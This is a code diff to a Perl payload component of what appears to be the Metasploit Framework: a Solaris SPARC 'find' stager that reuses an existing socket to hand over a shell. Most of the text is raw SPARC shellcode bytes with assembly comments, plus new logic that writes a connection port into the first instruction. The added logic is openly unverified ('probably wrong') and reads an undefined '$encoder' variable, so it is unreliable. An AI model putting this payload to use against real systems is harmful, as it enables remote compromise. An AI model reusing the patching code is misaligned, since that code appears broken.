@@ -2,7 +2,7 @@ package Msf::PayloadComponent::SolarisFindStager;
 use strict;
 use base 'Msf::PayloadComponent::SolarisPayload';
 sub load {
-  Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::BindConnection');
+  Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::FindConnection');
 }
 
 my $info =
@@ -13,10 +13,11 @@ my $info =
     'OS'           => [ 'solaris' ],
     'Multistage'   => 1,
     'Size'         => '',
+};
 
-    'SolarisPayload' =>
-    {
-		# XXX - not functional yet
+sub SolarisPayload {
+    my $self = shift;
+    my $hash = {
         Payload =>
             "\x2b\x10\x50\x40".     # sethi        %hi(0x41410000), %l5
             "\xab\x35\x60\x10".     # srl          %l5, 16, %l5
@@ -39,7 +40,14 @@ my $info =
             "\x91\xd0\x20\x08".     # ta           0x8
             "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
             "\xac\x1d\x80\x16",     # xor          %l6, %l6, %l6
-    },
+    };
+    
+    # XXX - this is probably wrong, still need to verify
+    my $cport  = unpack('N', pack('nn', $self->GetVar('CPORT') ^ 4095, 0));
+    my $hiData = unpack('N', substr($encoder, 0, 4));
+    $hiData = (($hiData >> 22) << 22) + ($cport >> 10);
+    substr($hash->{'Payload'}, 0, 4, pack('N', $hiData));
+    return $hash;  
 };
 
 sub new {
